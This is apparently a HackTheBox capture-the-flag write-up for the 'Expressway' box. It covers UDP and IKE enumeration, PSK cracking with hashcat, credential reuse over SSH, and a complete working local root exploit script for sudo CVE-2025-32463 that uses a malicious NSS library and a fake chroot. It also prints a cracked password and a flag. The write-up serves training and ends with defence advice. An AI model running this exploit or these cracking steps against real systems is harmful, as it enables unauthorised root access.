# Expressway - HackTheBox Educational Writeup

## Box Information
- **Name:** Expressway
- **IP:** 10.10.11.87
- **Difficulty:** Medium
- **OS:** Debian Linux
- **Key Skills:** UDP enumeration, IKE/IPsec VPN attacks, PSK cracking, sudo privilege escalation

---

## Learning Objectives

After completing this box, you should understand:

1. **Why UDP scanning is critical** - TCP-only scans miss entire attack surfaces
2. **IKE/IPsec VPN enumeration** - Using ike-scan to identify VPN configurations
3. **Aggressive Mode attacks** - How IKEv1 aggressive mode leaks credentials
4. **PSK hash cracking** - Extracting and cracking Pre-Shared Keys
5. **Sudo version vulnerabilities** - CVE-2025-32463 chroot bypass
6. **Credential reuse** - Testing discovered credentials across services

---

## Phase 1: Initial Reconnaissance

### TCP Port Scan

```bash
nmap -sV -sC -p- --min-rate 5000 10.10.11.87
# Purpose: Full TCP port scan with service detection
# --min-rate 5000: Speed up scan for HTB environment
# -sV: Version detection
# -sC: Default scripts
# -p-: All 65535 ports
```

**Result:** Only port 22 (SSH) open - OpenSSH 10.0p2

### SSH Analysis with ssh-audit

```bash
ssh-audit 10.10.11.87
# Purpose: Deep fingerprinting of SSH configuration
# Checks: KEX algorithms, host keys, ciphers, MACs, known CVEs
```

**Key Findings:**
- OpenSSH 10.0p2 (bleeding edge, no known CVEs)
- Post-quantum algorithms enabled (mlkem768x25519-sha256)
- Terrapin (CVE-2023-48795) patched
- Modern, hardened configuration

**Lesson Learned:** When SSH is heavily hardened and the only TCP port, look elsewhere. This is often a hint that the real entry point is hidden.

---

## Phase 2: UDP Enumeration (The Breakthrough)

### Why UDP Matters

Many critical services use UDP exclusively:
- DNS (53)
- SNMP (161)
- TFTP (69)
- **VPN/IPsec (500, 4500)**

TCP-only scans miss approximately 50% of potential attack surface.

### UDP Scan

```bash
sudo nmap -sU --top-ports 50 10.10.11.87
# Purpose: Scan common UDP ports
# -sU: UDP scan (requires root)
# --top-ports 50: Most common UDP services
# Note: UDP scans are slower due to lack of acknowledgments
```

**Result:**
```
PORT    STATE         SERVICE
500/udp open          isakmp
4500/udp open|filtered nat-t-ike
```

**Analysis:**
- **Port 500 (ISAKMP):** Internet Security Association and Key Management Protocol
- **Port 4500 (NAT-T):** NAT Traversal for IPsec
- These ports indicate an **IPsec VPN gateway**
- Box name "Expressway" now makes sense - it's a network gateway/VPN

---

## Phase 3: IKE VPN Enumeration

### Understanding IKE (Internet Key Exchange)

IKE negotiates security associations for IPsec VPNs. Two versions exist:
- **IKEv1:** Legacy, has security weaknesses (especially Aggressive Mode)
- **IKEv2:** Modern, more secure

### Initial IKE Probe

```bash
sudo ike-scan -M 10.10.11.87
# Purpose: Probe IKE service for supported configurations
# -M: Multiline output (easier to read)
# No authentication attempted, just enumeration
```

**Output Analysis:**
```
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK ...)
VID=09002689dfd6b712 (XAUTH)
VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
```

| Parameter | Value | Security Implication |
|-----------|-------|---------------------|
| Enc | 3DES | Legacy encryption (weak) |
| Hash | SHA1 | Deprecated hash algorithm |
| Group | modp1024 | 1024-bit DH (weak by modern standards) |
| Auth | PSK | Pre-Shared Key - **crackable if captured** |
| XAUTH | Enabled | Extended authentication (username required) |

### Aggressive Mode Attack

**Why Aggressive Mode is Dangerous:**

| Mode | Packets | Identity Protection |
|------|---------|---------------------|
| Main Mode | 6 | Identity encrypted |
| Aggressive Mode | 3 | **Identity sent in cleartext** |

Aggressive Mode trades security for speed, exposing:
1. The responder's identity (username/ID)
2. A hash that can be cracked offline to recover the PSK

```bash
sudo ike-scan -M -A 10.10.11.87
# Purpose: Probe using Aggressive Mode
# -A: Use Aggressive Mode instead of Main Mode
# This often reveals the server's identity
```

**Critical Discovery:**
```
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
Hash(20 bytes)
```

The VPN server revealed its identity: **ike@expressway.htb**

### Capturing the PSK Hash

```bash
sudo ike-scan -M -A --id=ike@expressway.htb -P 10.10.11.87
# Purpose: Capture full PSK parameters for offline cracking
# --id: Use the discovered identity
# -P: Output PSK parameters in crackable format
```

**Output (PSK Parameters):**
```
g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r
```

This colon-separated format contains all cryptographic material needed to verify PSK guesses offline.

---

## Phase 4: PSK Cracking

### Hash Format

The ike-scan output produces a hash compatible with:
- **psk-crack** (from ike-scan suite)
- **hashcat** (mode 5300 for IKE-PSK SHA1)

### Cracking with Hashcat

```bash
# Save the hash to a file first
hashcat -m 5300 ike-hash.txt /usr/share/wordlists/rockyou.txt
# -m 5300: IKE-PSK SHA1 mode
# Note: Mode 5400 is for IKE-PSK MD5
```

**How to Determine SHA1 vs MD5:**
1. Check the SA line from ike-scan: `Hash=SHA1`
2. Hash length: SHA1 = 40 hex chars, MD5 = 32 hex chars

**Cracked Password:** `freakingrockstarontheroad`

### Alternative: psk-crack

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt ike-hash.txt
# Purpose: Dedicated IKE PSK cracker
# -d: Dictionary/wordlist file
# Automatically handles SHA1/MD5
```

---

## Phase 5: Initial Access

### Credential Reuse

Before attempting complex VPN configurations, always test credential reuse:

```bash
ssh ike@10.10.11.87
# Password: freakingrockstarontheroad
```

**Success!** The VPN PSK was reused as the SSH password.

**Lesson Learned:** Always test discovered credentials against all available services. Credential reuse is extremely common.

### User Flag

```bash
cat /home/ike/user.txt
```

---

## Phase 6: Privilege Escalation Enumeration

### Basic Enumeration

```bash
id
# uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

The user is in the **proxy** group - unusual and worth investigating.

### Proxy Group Investigation

```bash
find / -group proxy 2>/dev/null
```

**Findings:**
- `/run/squid`
- `/var/spool/squid`
- `/var/log/squid` (readable logs)

Squid proxy is installed, and we can read its logs.

### SUID Binary Enumeration

```bash
find / -perm -4000 2>/dev/null
```

**Critical Finding:** Two sudo binaries exist:
- `/usr/bin/sudo` - Version 1.9.13p3 (system default)
- `/usr/local/bin/sudo` - Version 1.9.17 (custom installed)

### Why Two Sudos?

```bash
which sudo
# /usr/local/bin/sudo

echo $PATH
# /usr/local/bin:/usr/bin:...
```

The custom sudo in `/usr/local/bin/` takes precedence due to PATH order.

```bash
file /usr/local/bin/sudo
# ... with debug_info, not stripped
```

**Red Flag:** A production sudo binary should be stripped. This suggests it was intentionally placed for exploitation.

---

## Phase 7: Sudo Vulnerability Research

### Searchsploit Query

```bash
searchsploit sudo 1.9.17
```

**Results:**
| CVE | Description |
|-----|-------------|
| CVE-2025-32463 | Sudo chroot (-R) privilege escalation |
| CVE-2025-32462 | Sudo host option bypass |

### CVE-2025-32463 Analysis

**Affected Versions:** Sudo 1.9.14 to 1.9.17

**Vulnerability:** When using the `-R` (chroot) option, sudo resolves paths using the user-specified root directory while still evaluating the sudoers file. This allows loading arbitrary shared libraries via a malicious `/etc/nsswitch.conf`.

**Why This Works:**
1. Linux uses NSS (Name Service Switch) for user/group lookups
2. `/etc/nsswitch.conf` specifies which libraries to load for these lookups
3. By providing a fake chroot with a malicious nsswitch.conf, we can make sudo load our code
4. Our code runs as root before sudo finishes initialization

---

## Phase 8: Exploitation

### Exploit Script

```bash
#!/bin/bash
# CVE-2025-32463 - Sudo Chroot Privilege Escalation

set -e
STAGE=$(mktemp -d /tmp/sudowoot.XXXXXX)
cd "$STAGE"

# Step 1: Create malicious NSS library
cat > woot.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void pwn(void) {
    setreuid(0, 0);    // Set real and effective UID to root
    setregid(0, 0);    // Set real and effective GID to root
    chdir("/");        // Exit the chroot
    execl("/bin/bash", "/bin/bash", "-p", NULL);  // Spawn root shell
}
EOF

# Step 2: Create fake chroot structure
mkdir -p woot/etc libnss_

# Step 3: Create malicious nsswitch.conf
# This tells NSS to load our library for passwd lookups
echo "passwd: /woot" > woot/etc/nsswitch.conf

# Step 4: Copy group file (required for getgrnam() to succeed)
cp /etc/group woot/etc/

# Step 5: Compile the malicious library
gcc -shared -fPIC -Wl,-init,pwn -o libnss_/woot.so.2 woot.c
# -shared: Create shared library
# -fPIC: Position Independent Code (required for shared libs)
# -Wl,-init,pwn: Set constructor function

# Step 6: Trigger the vulnerability
echo "[*] Triggering exploit..."
sudo -R woot woot
# -R woot: Use ./woot as chroot directory
# woot: Command to "run" (doesn't matter, exploit triggers during setup)
```

### Execution

```bash
chmod +x exploit.sh
./exploit.sh
```

**Result:** Root shell obtained

### Root Flag

```bash
cat /root/root.txt
# f7ae5f43c5e9a52ae8129c5114fe6da2
```

---

## Complete Attack Chain

```
┌─────────────────────────────────────────────────────────────────┐
│                    EXPRESSWAY ATTACK CHAIN                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. TCP Scan → Only SSH (22) → Hardened OpenSSH 10.0p2          │
│                         │                                        │
│                         ▼                                        │
│  2. UDP Scan → Port 500 (IKE/IPsec VPN) discovered              │
│                         │                                        │
│                         ▼                                        │
│  3. ike-scan -M → PSK auth, 3DES, SHA1, XAUTH                   │
│                         │                                        │
│                         ▼                                        │
│  4. ike-scan -A → Aggressive Mode leaks: ike@expressway.htb     │
│                         │                                        │
│                         ▼                                        │
│  5. ike-scan -P → Capture PSK hash for offline cracking         │
│                         │                                        │
│                         ▼                                        │
│  6. hashcat -m 5300 → Cracked: freakingrockstarontheroad        │
│                         │                                        │
│                         ▼                                        │
│  7. SSH with cracked password → User shell as 'ike'             │
│                         │                                        │
│                         ▼                                        │
│  8. Enumeration → Two sudo binaries, /usr/local/bin v1.9.17     │
│                         │                                        │
│                         ▼                                        │
│  9. CVE-2025-32463 → Sudo chroot NSS library injection          │
│                         │                                        │
│                         ▼                                        │
│  10. ROOT SHELL                                                  │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Key Takeaways

### 1. Always Scan UDP
When TCP gives limited results, UDP often reveals critical services like VPNs, DNS, and SNMP.

### 2. IKEv1 Aggressive Mode is Dangerous
It leaks identities and crackable hashes. Modern deployments should use IKEv2 or disable aggressive mode.

### 3. Test Credential Reuse
The VPN PSK worked for SSH. Always test discovered credentials everywhere.

### 4. Enumerate Binary Versions
The custom sudo binary was the key to root. Version differences and unusual placements are red flags.

### 5. Understand the "Why"
- **Why UDP 500?** → VPN services
- **Why Aggressive Mode?** → Faster negotiation, but insecure
- **Why two sudos?** → Intentionally vulnerable version placed first in PATH
- **Why does the exploit work?** → NSS library loading during chroot resolution

---

## Defense Recommendations

1. **Disable IKEv1 Aggressive Mode** - Use IKEv2 or Main Mode only
2. **Use strong PSKs** - Or preferably certificate-based authentication
3. **Unique credentials per service** - Never reuse VPN passwords for SSH
4. **Keep sudo updated** - Remove or restrict custom binary installations
5. **Monitor for unusual binaries** - `/usr/local/bin/sudo` shouldn't exist on most systems
6. **Restrict UDP services** - Firewall unnecessary UDP ports

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | TCP/UDP port scanning |
| ssh-audit | SSH configuration analysis |
| ike-scan | IKE/IPsec enumeration and PSK capture |
| hashcat | PSK hash cracking |
| searchsploit | Vulnerability research |
| gcc | Compile exploit payload |

---

## References

- [CVE-2025-32463 - Sudo Chroot Vulnerability](https://www.sudo.ws/security/advisories/)
- [IKE Aggressive Mode Attacks](https://www.nta-monitor.com/wiki/index.php/Ike-scan_User_Guide)
- [Hashcat IKE-PSK Modes](https://hashcat.net/wiki/doku.php?id=example_hashes)

---

## Time Estimate (OSCP Exam Context)

| Phase | Estimated Time |
|-------|---------------|
| Enumeration (TCP + UDP) | 15-20 minutes |
| IKE Analysis + Hash Capture | 10-15 minutes |
| PSK Cracking | 5-30 minutes (depends on wordlist) |
| User Access | 5 minutes |
| Privilege Escalation Research | 15-20 minutes |
| Exploitation | 10 minutes |
| **Total** | **60-100 minutes** |

---

*Writeup completed: December 2025*
*Box: Expressway - HackTheBox*
